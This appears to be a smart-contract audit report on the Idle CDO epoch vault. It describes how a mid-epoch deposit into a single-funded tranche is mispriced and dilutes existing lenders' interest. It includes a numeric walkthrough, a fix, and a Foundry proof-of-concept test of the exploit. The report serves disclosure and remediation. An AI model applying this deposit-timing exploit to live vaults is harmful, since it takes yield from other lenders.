### Title
Mid-epoch deposits mint shares against a split-ratio price while a single-funded tranche earns 100% of epoch interest — dilution of existing lenders - (File: contracts/IdleCDOEpochVariant.sol)

### Summary
`depositDuringEpoch` prices new tranche tokens off `expectedFinal = lastTrancheNAV + trancheExpected`, where `trancheExpected` is only the `trancheAPRSplitRatio` share of `expectedEpochInterest`. But at `stopEpoch`, `_virtualPriceAux` in `IdleCDOCreditVault` gives the *entire* epoch gain to a tranche when it is the only class holding NAV (`_lastNAV == _lastTrancheNAV`). An attacker can deposit into the sole funded tranche just before `epochEndDate`, mint shares priced as if the other tranche would absorb part of the yield, and immediately capture realized interest that was earned entirely on pre-existing NAV. This is the same bug class as M-44: entering at a price that does not reflect the imminent, publicly known profit credit.

### Finding Description
`depositDuringEpoch` computes minted shares as `_minted = (_amount + trancheInterest) * _trancheTotSupply / expectedFinal` where `expectedFinal = _lastSavedNAV(_tranche) + trancheExpected` and `trancheExpected` is the tranche's split-ratio portion of net `expectedEpochInterest` (IdleCDOEpochVariant.sol:704-724). The implicit assumption is that at `stopEpoch` the gain will be divided between AA and BB by `trancheAPRSplitRatio`.

However, `_virtualPriceAux` in `IdleCDOCreditVault.sol` contains a single-sided exception: when the other tranche holds no NAV, `_lastNAV == _lastTrancheNAV` and `_totalTrancheGain = totalGain`, i.e. the funded tranche receives 100% of the epoch interest regardless of `trancheAPRSplitRatio` (IdleCDOCreditVault.sol:321-322). `depositDuringEpoch` only requires the *deposited* tranche to have supply (`_checkNotAllowed(_trancheTotSupply == 0)`, line 677); an AA-only (or BB-only) fixed-APR pool is perfectly reachable since `isAYSActive == false` is the required mode and the other tranche is never forced to exist.

Numeric example (10% APR epoch, `trancheAPRSplitRatio = 50%`, AA-only pool, NAV 1000, supply 1000e18, expected interest 100):
- Attacker deposits 1000 at `epochEndDate - 1`. `interest ≈ _calcInterest(1000) * buffer/(epoch+buffer)` (a few units), `trancheExpected = 50` → `expectedFinal = 1050`, `minted ≈ 952e18`.
- `stopEpoch`: `totalGain ≈ 101` goes entirely to AA (`_lastNAV == lastNAVAA`). Contract value ≈ 2101, supply ≈ 1952e18, price ≈ 1.0764.
- Attacker's shares are worth ≈ 1025 for a 1000 deposit — a ~2.5% instant, near-riskless gain extracted from the 100 interest earned on existing lenders' NAV (they receive ≈ 1076 instead of 1100).

The attacker then exits via `requestWithdraw` during the buffer (receipt fixed at the inflated price) and `claimWithdrawRequest` after the next `stopEpoch`, exactly mirroring the Derby deposit-before/withdraw-after flow.

### Impact Explanation
Direct theft/dilution of realized epoch yield belonging to existing tranche holders, quantifiable as `(1 - trancheAPRSplitRatio)` (for AA deposits; `trancheAPRSplitRatio` for BB) of the epoch's net interest times the attacker's share of post-deposit supply. With a 50% split and an attacker matching TVL, roughly half the "other tranche's" nominal share of epoch interest is siphoned per deposit, repeatedly each epoch.

### Likelihood Explanation
Requires `isDepositDuringEpochDisabled == false`, `isAYSActive == false`, non-programmable borrower, KYC pass, and a single-funded tranche — an explicitly supported configuration per the function's own checks and tests (`testDepositDuringEpochNumericalAA` uses an AA-only vault). The deposit must land in `(epochEndDate - ε, epochEndDate)`, which is fully under the attacker's control since `stopEpoch` can only run after `epochEndDate`. No privileged cooperation is needed.

### Recommendation
In `depositDuringEpoch`, compute `expectedFinal` using the same attribution rule `_virtualPriceAux` will apply at `stopEpoch`: when the other tranche has zero saved NAV (or zero effective participation), assign the full net `expectedEpochInterest` to the deposited tranche instead of `trancheExpected`. Equivalently, gate mid-epoch deposits to pools where both tranches hold NAV.

### Proof of Concept
```solidity
// SPDX-License-Identifier: UNLICENSED
// Foundry fork test, modeled on test/foundry/IdleCreditVault.t.sol::testDepositDuringEpochNumericalAA
function testMidEpochDepositDilutesSingleSidedTranche() external {
    // 10% apr, 30-day epoch, 5-day buffer, fixed-APR mode, split ratio 50%
    vm.startPrank(manager);
    cdoEpoch.setEpochParams(30 days, 5 days);
    IdleCreditVault(address(strategy)).setAprs(10e18, 10e18);
    vm.stopPrank();

    // AA-only vault: existing lender deposits 1000
    idleCDO.depositAA(1000 * ONE_SCALE);
    vm.prank(owner);
    cdoEpoch.setIsAYSActive(false);
    _startEpochAndCheckPrices(0); // expectedEpochInterest = 1000 * 10% * 35/365-ish

    // Attacker deposits at the last valid second of the running epoch
    vm.warp(cdoEpoch.epochEndDate() - 1);
    vm.prank(owner);
    cdoEpoch.setIsDepositDuringEpochDisabled(false);

    address bob = makeAddr('bob'); // KYC-passed lender
    uint256 depositAmount = 1000 * ONE_SCALE;
    deal(defaultUnderlying, bob, depositAmount);
    vm.startPrank(bob);
    IERC20Detailed(defaultUnderlying).approve(address(cdoEpoch), depositAmount);
    uint256 minted = cdoEpoch.depositDuringEpoch(depositAmount, address(AAtranche));
    vm.stopPrank();

    // Borrower repays principal + interest; epoch stops and gain goes 100% to AA
    _toggleEpoch(false, 10e18, _expectedFundsEndEpoch());

    uint256 price = cdoEpoch.virtualPrice(address(AAtranche));
    uint256 bobValue = minted * price / ONE_TRANCHE_TOKEN;

    // Bob paid ~nothing for the epoch interest (remaining ~ 0) yet his shares
    // were priced assuming AA only gets trancheAPRSplitRatio of the gain.
    // BobValue exceeds depositAmount + his own prorated interest,
    // and existing lender value is < principal + full epoch interest.
    assertGt(bobValue, depositAmount + _calcInterest(depositAmount) * cdoEpoch.bufferPeriod() / (cdoEpoch.epochDuration() + cdoEpoch.bufferPeriod()) + 1);

    // Bob exits: request withdraw during buffer, claim after next stopEpoch
    vm.prank(bob);
    cdoEpoch.requestWithdraw(0, address(AAtranche));
}
```

Relevant code: [1](#0-0) [2](#0-1) [3](#0-2) [4](#0-3)

### Citations

**File:** contracts/IdleCDOEpochVariant.sol (L435-437)
```text
      // update tranche prices and unclaimed fees
      _updateAccounting();

```

**File:** contracts/IdleCDOEpochVariant.sol (L656-668)
```text
  function depositDuringEpoch(uint256 _amount, address _tranche) external virtual returns (uint256 _minted) {
    _checkTranche(_tranche);
    _checkNotAllowed(
      (_tranche == BBTranche && !isBBDepositEnabled) ||
      isDepositDuringEpochDisabled ||
      skipDefaultCheck ||
      // programmable borrowers use APR=0 so mid-epoch deposits would dilute existing depositors
      isProgrammableBorrower ||
      // check if AYS is active as we don't support deposits during epoch in that case
      isAYSActive ||
      // check if epoch is still running even if not manually stopped yet
      !isEpochRunning || block.timestamp >= epochEndDate ||
      !isWalletAllowed(msg.sender)
```

**File:** contracts/IdleCDOEpochVariant.sol (L699-725)
```text
    uint256 expectedInt = expectedEpochInterest;
    uint256 pendingFees = pendingWithdrawFees;
    uint256 trancheExpected;
    // existing holders' share of net expected interest for the epoch (pre-deposit)
    // (exclude pendingWithdrawFees since they go to fee receivers, not tranche holders)
    if (expectedInt > pendingFees) {
      trancheExpected = _calcTrancheInterestShare(
        _netGainAfterFees(expectedInt - pendingFees, _calculateManagementFee(lastNAVAA + lastNAVBB, remaining)),
        _tranche
      );
    }
    // interest this deposit will earn for the tranche over the remaining time (net of fees)
    uint256 trancheInterest = _calcTrancheInterestShare(
      _netGainAfterFees(interest, _calculateManagementFee(_amount, remaining)),
      _tranche
    );
    // pre-deposit expected final NAV for existing holders.
    // This won't ever be zero as we checked _trancheTotSupply and we seed initial NAV at tranche creation
    uint256 expectedFinal = _lastSavedNAV(_tranche) + trancheExpected;

    // mint at a discounted price so depositor gets principal + its prorated interest at epoch end
    // A mid‑epoch depositor should get _amount + trancheInterest at epoch end.
    // So they need minted = (amount + trancheInterest) / priceEnd.
    // priceEnd = expectedFinal / _trancheTotSupply
    // so minted = (amount + trancheInterest) * _trancheTotSupply / expectedFinal
    _minted = (_amount + trancheInterest) * _trancheTotSupply / expectedFinal;
    _mintShares(_tranche, msg.sender, _minted, _amount);
```

**File:** contracts/IdleCDOCreditVault.sol (L316-336)
```text
    bool _isAATranche = _tranche == AATranche;
    // A class with no saved NAV cannot be revived by later gains. If only this class has saved
    // NAV, it receives the full gain or loss; otherwise both classes participate.
    if (_lastTrancheNAV == 0) {
      _totalTrancheGain = 0;
    } else if (_lastNAV == _lastTrancheNAV) {
      _totalTrancheGain = totalGain;
    } else {
      if (totalGain > 0) {
        // Split the net gain, according to _trancheAPRSplitRatio, with precision loss favoring the AA tranche.
        int256 totalBBGain = totalGain * int256(FULL_ALLOC - _trancheAPRSplitRatio) / int256(FULL_ALLOC);
        // The new NAV for the tranche is old NAV + total gain for the tranche
        _totalTrancheGain = _isAATranche ? (totalGain - totalBBGain) : totalBBGain;
      } else {
        int256 maxBBLoss = -int256(lastNAVBB);
        int256 totalBBLoss = totalGain > maxBBLoss ? totalGain : maxBBLoss;
        _totalTrancheGain = _isAATranche ? totalGain - totalBBLoss : totalBBLoss;
      }
    }
    // Split the new NAV (_lastTrancheNAV + _totalTrancheGain) per tranche token
    _virtualPrice = uint256(int256(_lastTrancheNAV) + _totalTrancheGain) * ONE_TRANCHE_TOKEN / trancheSupply;
```
